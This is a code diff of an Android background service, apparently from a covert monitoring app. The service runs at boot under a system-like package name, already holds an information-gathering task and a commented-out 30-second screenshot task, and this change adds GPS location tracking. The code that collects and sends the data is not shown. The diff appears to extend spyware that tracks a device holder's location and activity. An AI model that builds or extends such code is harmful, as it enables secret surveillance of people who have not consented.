@@ -7,6 +7,7 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.gps.GpsUtil;
 import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
@@ -38,6 +39,8 @@ public class BootService extends Service
 	private CaptureTask mCapTask;
 	private final long mScreenshotDelay  = 3000;  // 3  Seconds
 	private final long mScreenshotPeriod = 30000; // 30 Seconds
+	
+	public static GpsUtil gps;
 
 	@Override
 	public IBinder onBind(final Intent intent) {
@@ -60,13 +63,22 @@ public class BootService extends Service
 	public void onCreate() {
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onCreate();
+		
+		//SysUtils.messageBox(getApplicationContext(), "BootService onCreate() entered");
+		
 		Log.v(LOGTAG, "created");
 		
 		mGetInfoTimer = new Timer();
-		mInfoTask = new GetInfoTask(this.getApplicationContext());
+		mInfoTask = new GetInfoTask(getApplicationContext());
+		
+		//SysUtils.messageBox(getApplicationContext(), "GetInfoTask created");
 		
 		//mScreenshotTimer = new Timer();
 		//mCapTask = new CaptureTask(this);
+		
+		gps = new GpsUtil(getApplicationContext());
+		
+		//SysUtils.messageBox(getApplicationContext(), "BootService onCreate() exit");
 	}
 
 	@Override
